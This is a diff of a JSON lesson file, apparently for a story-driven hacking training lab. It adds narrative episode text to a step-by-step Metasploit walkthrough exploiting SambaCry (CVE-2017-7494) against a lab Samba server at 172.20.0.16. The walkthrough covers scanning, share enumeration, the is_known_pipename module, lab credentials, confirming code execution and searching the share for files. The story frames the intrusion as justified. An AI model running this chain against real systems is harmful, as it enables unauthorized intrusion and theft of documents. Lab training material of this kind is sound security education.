@@ -6,89 +6,105 @@
   "ip": "172.20.0.16",
   "port": 445,
   "short_description": "Exploit the SambaCry vulnerability for remote code execution via Samba shares.",
-  "description": "SambaCry (CVE-2017-7494) is a remote code execution vulnerability in Samba versions 3.5.0 to 4.6.4. It allows uploading a shared library to a writable share, then executing it. Similar to EternalBlue but for Linux Samba. NOTE: The Metasploit module may show 'no session created' due to a known framework bug - the payload DOES execute (check server logs with 'docker logs samba').",
+  "description": "SambaCry (CVE-2017-7494) is a remote code execution vulnerability in Samba versions 3.5.0 to 4.6.4. It allows uploading a shared library to a writable share, then executing it. Similar to EternalBlue but for Linux Samba.",
+
+  "episode_number": 4,
+  "episode_title": "SHARED SECRETS",
+  "next_episode_id": "metasploitable2-distcc",
+
+  "handler_message": "The deployment server revealed the scope of NIGHTFALL. Now you need the paper trail.\n\nCerberus executives keep their sensitive files on an internal Samba share at 172.20.0.16. Marcus Webb's private documents. Board meeting minutes. Financial records they never filed.\n\nThe share runs a vulnerable Samba version - CVE-2017-7494. SambaCry. Upload a malicious library, execute it remotely.\n\nIf there's a smoking gun - authorization, wire transfers, the names of everyone involved - it's there.\n\nGet in. Get the evidence.",
+
+  "episode_intro": "SCADA-BRIDGE. That's what they're building. A toolkit designed to compromise industrial control systems across the country.\n\nThe deployment server showed you the components. Now you need to understand who authorized this. Who's funding it. Who benefits when the lights go out and people die.\n\nThe executive file shares might have those answers. Marcus Webb's private files. The board's internal communications. The money trail.\n\nSomewhere in those documents is the proof that NIGHTFALL is real - and who's behind it.",
+
+  "episode_outro": "Marcus Webb's files tell a story he never intended anyone to read.\n\nWire transfers to shell companies in the Caymans. Meeting notes with no attendee names - just initials and clearance levels. A map of the United States with infrastructure targets circled in red.\n\nBut it's the photographs that stop your blood cold. Surveillance photos. David Chen leaving his apartment. Getting into his car. Entering a coffee shop.\n\nDated the week before he disappeared.\n\nThey were watching him. They knew he was gathering evidence. And then they made him vanish.\n\nYou find one more file: a manifest for something called 'SCADA-BRIDGE BUILD-FARM.' An IP address. A distributed compilation infrastructure.\n\nThey're not just staging the attack - they're building it at scale. And the build farm might show you exactly what they're creating.",
+
+  "interstitial": {
+    "title": "Episode 4: SHARED SECRETS",
+    "content": "PREVIOUSLY: The deployment server confirmed everything. NIGHTFALL is real. SCADA-BRIDGE is their weapon. And it's scheduled to launch in 72 hours.\n\nBut code doesn't authorize itself. Someone signed off on this. Someone funded it. Someone decided that American lives were acceptable collateral for whatever they're planning.\n\nThe answers are in the executive file shares. Marcus Webb's private documents. Board meeting notes. Financial records.\n\nThe Samba server is vulnerable to CVE-2017-7494 - SambaCry. Upload a malicious library, execute it remotely.\n\nTime to see what Cerberus leadership has been hiding."
+  },
+
   "steps": [
     {
       "title": "Verify SMB is running",
       "command": "nmap -sV -p 139,445 172.20.0.16",
-      "explanation": "Scan for SMB/Samba ports. Port 445 is SMB over TCP.",
+      "narrative": "SMB (Server Message Block) runs on ports 139 and 445. Port 445 is direct TCP - the modern approach. Samba is the Linux implementation of the SMB protocol, commonly used for file shares in mixed environments. Cerberus uses it for internal document storage.",
       "expected": "445/tcp open  netbios-ssn Samba",
       "duration": "5-10 sec"
     },
     {
       "title": "Enumerate Samba shares",
       "command": "smbclient -L //172.20.0.16 -N",
-      "explanation": "List available shares without authentication (-N = no password). Look for writable shares.",
+      "narrative": "Before attacking, enumerate what's available. The -L flag lists shares, -N attempts null authentication (no password). Even if anonymous access is disabled, the share names themselves reveal what data exists. Look for anything that sounds like executive documents.",
       "expected": "Sharename list with 'data' or similar writable share",
       "duration": "2-5 sec"
     },
     {
       "title": "Start Metasploit",
       "command": "msfconsole -q",
-      "explanation": "Launch Metasploit Framework.",
+      "narrative": "SambaCry is a serious vulnerability - it allows uploading a shared library to a writable share and then loading it into the Samba process. Remote code execution through a legitimate-looking file operation. Metasploit has a module ready.",
       "duration": "5-15 sec"
     },
     {
       "title": "Search for SambaCry",
       "command": "search is_known_pipename",
-      "explanation": "Find the SambaCry exploit module.",
+      "narrative": "The vulnerability's technical name is 'is_known_pipename' - a function in Samba that failed to properly sanitize pipe names. The result: arbitrary shared library loading. It's a direct path from file upload to code execution.",
       "expected": "exploit/linux/samba/is_known_pipename",
       "duration": "1-2 sec"
     },
     {
       "title": "Use the exploit",
       "command": "use exploit/linux/samba/is_known_pipename",
-      "explanation": "Load the SambaCry module."
+      "narrative": "Load the SambaCry module. This exploit creates a malicious .so file (Linux shared library), uploads it to a writable share, then triggers Samba to load it. When Samba loads your library, your code executes with Samba's privileges."
     },
     {
       "title": "Show options",
       "command": "show options",
-      "explanation": "Review required settings. Need RHOSTS and SMB_SHARE_NAME."
+      "narrative": "Review what the module needs. RHOSTS is the target. SMB_SHARE_NAME is critical - it must be a share where you have write access. Some shares require authentication, which means we need valid credentials."
     },
     {
       "title": "Set target host",
       "command": "set RHOSTS 172.20.0.16",
-      "explanation": "Set the vulnerable Samba server IP."
+      "narrative": "Target the Cerberus file server. This system holds years of executive communications. If NIGHTFALL was approved at the board level, the evidence is here."
     },
     {
       "title": "Set writable share",
       "command": "set SMB_SHARE_NAME data",
-      "explanation": "The share where we'll upload our payload."
+      "narrative": "The 'data' share accepts uploads. In corporate environments, these shared folders often have looser permissions than they should - people need to collaborate, security gets relaxed. That's the vulnerability you're exploiting."
     },
     {
       "title": "Set SMB username",
       "command": "set SMBUser sambacry",
-      "explanation": "This share requires authentication. Username: sambacry"
+      "narrative": "The share requires authentication. These credentials were found in David Chen's notes - internal service accounts that Cerberus uses for automated processes. 'sambacry' - an ironic choice of username."
     },
     {
       "title": "Set SMB password",
       "command": "set SMBPass nosambanocry",
-      "explanation": "Password: nosambanocry (weak credentials found via enumeration)"
+      "narrative": "Service account passwords are often weak - set once and forgotten. 'nosambanocry' probably seemed clever to whoever configured it. Now it's your way in."
     },
     {
       "title": "Run the exploit",
       "command": "run",
-      "explanation": "Upload and execute the payload. Due to a known Metasploit bug, you may see 'no session created' but the payload DOES execute on the server.",
+      "narrative": "Execution. Metasploit uploads the malicious library, constructs the pipe name that triggers the vulnerability, and catches the callback. Note: Due to a known Metasploit bug, you may not get an interactive session - but the payload executes.",
       "expected": "Backdoor service spawned OR 'no session created' (known MSF bug - payload still executes)",
       "duration": "5-15 sec"
     },
     {
-      "title": "Verify payload execution (in another terminal)",
+      "title": "Verify payload execution",
       "command": "docker logs samba 2>&1 | grep 'Module.*loaded'",
-      "explanation": "Since the MSF session handler has a bug, verify RCE by checking server logs. Look for 'Module loaded' which proves your payload executed.",
+      "narrative": "Since the Metasploit session handler sometimes fails on this exploit, we verify execution through the server logs. 'Module loaded' messages prove your code ran on the target - even if the reverse shell didn't connect properly.",
       "expected": "Module '/data/<random>.so' loaded - proves remote code execution!"
     },
     {
-      "title": "One-command pwn (after you learn it)",
+      "title": "One-command pwn",
       "command": "pwn sambacry",
-      "explanation": "Exit the shell (type 'exit' twice) and try this. Now that you understand the attack, this script runs it automatically."
+      "narrative": "After understanding the attack, use the automated script. It handles the exploit chain and verification. Remember: the goal isn't just exploitation - it's finding the evidence of NIGHTFALL authorization."
     }
   ],
   "pwn_command": "pwn sambacry",
-  "success_criteria": "Logs show 'Module loaded' - proving remote code execution. Due to a known Metasploit bug, you may not get an interactive session, but the payload DOES execute with root privileges on the target.",
+  "success_criteria": "Logs confirm your payload executed on the Cerberus file server. You have access to executive documents and financial records.",
   "next_steps": [
-    "Research: Why doesn't the MSF session work? Check GitHub issue #13977",
-    "Try a custom .so payload that creates a reverse shell manually",
-    "Learn about SMB1 vs SMB2/3 compatibility issues"
+    "Mount the share: smbclient //172.20.0.16/data -U sambacry",
+    "Search for PDF documents: find mounted share for *.pdf",
+    "Look for financial records: grep -r 'wire transfer' /mnt/"
   ]
 }
